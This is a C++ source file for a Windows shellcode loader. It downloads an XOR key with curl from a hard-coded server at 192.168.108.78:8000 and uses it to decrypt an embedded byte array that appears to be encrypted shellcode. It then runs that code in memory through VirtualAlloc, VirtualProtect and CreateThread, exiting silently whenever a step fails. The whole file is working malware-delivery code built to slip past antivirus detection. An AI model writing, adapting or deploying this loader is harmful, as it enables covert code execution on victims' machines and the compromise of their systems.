#include <windows.h>
#include <stdio.h>
#include <cstdlib>
#include <sstream>
#include <iostream>
#include <string>

using namespace std;

// Function to fetch the key from a webserver
string fetchStringFromWeb(const string& url) {
    string command = "curl -s " + url; // Curl command to fetch content silently
    ostringstream result;

    // Open a pipe to the curl command
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return ""; // Return an empty string if the command fails
    }

    char buffer[128];
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result << buffer; // Append each line to the stringstream
    }

    pclose(pipe); // Close the pipe
    return result.str(); // Return the content as a string
}

// XOR decryption function
void XOR(char* data, size_t data_len, const char* key, size_t key_len) {
    size_t j = 0;
    for (size_t i = 0; i < data_len; i++) {
        data[i] ^= key[j];
        j = (j + 1) % key_len;
    }
}

int main() {
    // Fetch the key from the webserver
    string url = "http://192.168.108.78:8000/pizza.txt";
    string result = fetchStringFromWeb(url);

    if (result.empty()) {
        // Exit silently if the key is not fetched
        return 1;
    }

    // Payload and its length
    unsigned char buf[] = {
        0x88, 0x20, 0xe6, 0x8a, 0x95, 0x9f, 0xab, 0x65, 0x79, 0x74, 0x29, 0x34, 0x2f, 0x35, 0x25, 0x3a, 0x33, 0x31, 0x45, 0xba, 0x0, 0x26, 0xee, 0x25, 0xb, 0x2d, 0xf2, 0x26, 0x70, 0x2d, 0xe5, 0x37, 0x57, 0x23, 0xee, 0xb, 0x24, 0x20, 0x6a, 0xd9, 0x2f, 0x3d, 0x26, 0x54, 0xb0, 0x3c, 0x59, 0xa5, 0xc2, 0x59, 0x16, 0x17, 0x67, 0x55, 0x54, 0x29, 0xa4, 0xa7, 0x68, 0x36, 0x6a, 0xa4, 0x9b, 0x99, 0x3a, 0x24, 0x3f, 0x2d, 0xfc, 0x39, 0x45, 0xf2, 0x36, 0x54, 0x2d, 0x6f, 0xb5, 0xfc, 0xeb, 0xed, 0x79, 0x74, 0x68, 0x2d, 0xeb, 0xa5, 0x3, 0xc, 0x2d, 0x78, 0xa4, 0x38, 0xee, 0x26, 0x7d, 0x33, 0xe0, 0x25, 0x59, 0x3d, 0x69, 0xb5, 0x8d, 0x33, 0x3f, 0x94, 0xac, 0x38, 0xff, 0x5c, 0xed, 0x26, 0x64, 0xa1, 0x26, 0x54, 0xb0, 0x3c, 0x59, 0xa5, 0xc2, 0x24, 0xb6, 0xa2, 0x68, 0x38, 0x75, 0xa9, 0x5d, 0x8e, 0x10, 0x86, 0x27, 0x66, 0x35, 0x50, 0x60, 0x20, 0x57, 0xb4, 0x2, 0xb3, 0x3d, 0x3d, 0xff, 0x28, 0x41, 0x27, 0x64, 0xa7, 0xd, 0x24, 0xf2, 0x78, 0x20, 0x21, 0xe5, 0x25, 0x6b, 0x22, 0x64, 0xa9, 0x35, 0xe3, 0x61, 0xe6, 0x2d, 0x76, 0xbb, 0x24, 0x21, 0x35, 0x30, 0x3b, 0x37, 0x3f, 0x36, 0x33, 0x24, 0x20, 0x35, 0x32, 0x2d, 0xed, 0x89, 0x57, 0x2a, 0x37, 0x86, 0x94, 0x30, 0x24, 0x37, 0x3f, 0x3f, 0xe0, 0x77, 0x90, 0x23, 0x97, 0x9a, 0x91, 0x38, 0x3e, 0xd5, 0x12, 0xa, 0x46, 0x37, 0x56, 0x5c, 0x65, 0x77, 0x2a, 0x33, 0x30, 0xfd, 0x8e, 0x2d, 0xef, 0x89, 0xd7, 0x6a, 0x65, 0x79, 0x3d, 0xe1, 0x80, 0x27, 0xd9, 0x75, 0x6b, 0x60, 0x40, 0xb4, 0xc0, 0x9, 0x20, 0x24, 0x23, 0x22, 0xec, 0x9d, 0x38, 0xe1, 0x94, 0x2f, 0xdf, 0x3b, 0x1c, 0x43, 0x7e, 0x8b, 0xbd, 0x29, 0xe7, 0x8f, 0x1f, 0x6a, 0x64, 0x79, 0x74, 0x31, 0x24, 0xd4, 0x4c, 0xf7, 0x0, 0x65, 0x86, 0xa1, 0x38, 0x35, 0x23, 0x54, 0xbe, 0x26, 0x54, 0xb9, 0x3c, 0x97, 0xa5, 0x26, 0xec, 0xb5, 0x23, 0x9a, 0xb9, 0x3c, 0xe1, 0xa4, 0x2f, 0xdf, 0x9d, 0x64, 0xba, 0x99, 0x8b, 0xbd, 0x2d, 0xe7, 0xa2, 0x1d, 0x7b, 0x24, 0x21, 0x38, 0xe1, 0x87, 0x26, 0xec, 0x8e, 0x2a, 0xdf, 0xe0, 0xd1, 0x1c, 0x4, 0x91, 0xb0, 0x3f, 0xea, 0xa1, 0x39, 0x76, 0x68, 0x65, 0x27, 0xdd, 0x14, 0x6, 0x1, 0x79, 0x74, 0x68, 0x65, 0x6e, 0x24, 0x27, 0x2a, 0x35, 0x31, 0xfd, 0x8a, 0x32, 0x39, 0x32, 0x3a, 0x5a, 0xa5, 0x13, 0x79, 0x31, 0x24, 0x3e, 0x87, 0x8b, 0xd, 0xa2, 0x3d, 0x50, 0x3c, 0x64, 0x6f, 0x2d, 0xfa, 0x2f, 0x41, 0x61, 0xb2, 0x68, 0xd, 0x26, 0xec, 0x91, 0x3d, 0x35, 0x38, 0x24, 0x29, 0x35, 0x2f, 0x35, 0x3e, 0x94, 0xa5, 0x38, 0x24, 0x21, 0x9a, 0xa6, 0x28, 0xfe, 0xaa, 0x29, 0xf0, 0xb5, 0x29, 0xdf, 0x17, 0xa9, 0x48, 0xed, 0x9a, 0xac, 0x3c, 0x59, 0xb7, 0x26, 0x9a, 0xbd, 0xe0, 0x6b, 0x38, 0xce, 0x60, 0xe2, 0x73, 0x5, 0x88, 0xbe, 0xde, 0x89, 0xc1, 0xca, 0x33, 0x2f, 0xdf, 0xd1, 0xfe, 0xd8, 0xe4, 0x8b, 0xbd, 0x2d, 0xed, 0xa1, 0x5f, 0x57, 0x63, 0x5, 0x7e, 0xe8, 0x9e, 0x8e, 0x10, 0x72, 0xd0, 0x22, 0x6a, 0x6, 0x7, 0xf, 0x6e, 0x3c, 0x36, 0xe2, 0xbf, 0x86, 0xa1 
        // (Add the rest of your encrypted payload here)
    };
    unsigned int my_payload_len = sizeof(buf);

    // Decrypt the payload using the fetched key
    XOR((char*)buf, my_payload_len, result.c_str(), result.size());

    // Allocate memory for the decrypted payload
    void* my_payload_mem = VirtualAlloc(0, my_payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!my_payload_mem) {
        return 1; // Exit silently if memory allocation fails
    }

    // Copy the decrypted payload to allocated memory
    RtlMoveMemory(my_payload_mem, buf, my_payload_len);

    // Make the allocated memory executable
    DWORD oldprotect = 0;
    if (VirtualProtect(my_payload_mem, my_payload_len, PAGE_EXECUTE_READ, &oldprotect)) {
        // Execute the payload
        HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)my_payload_mem, 0, 0, 0);
        if (th) {
            WaitForSingleObject(th, INFINITE);
            CloseHandle(th);
        }
    }

    // Free the allocated memory
    VirtualFree(my_payload_mem, 0, MEM_RELEASE);

    return 0; // Exit silently
}
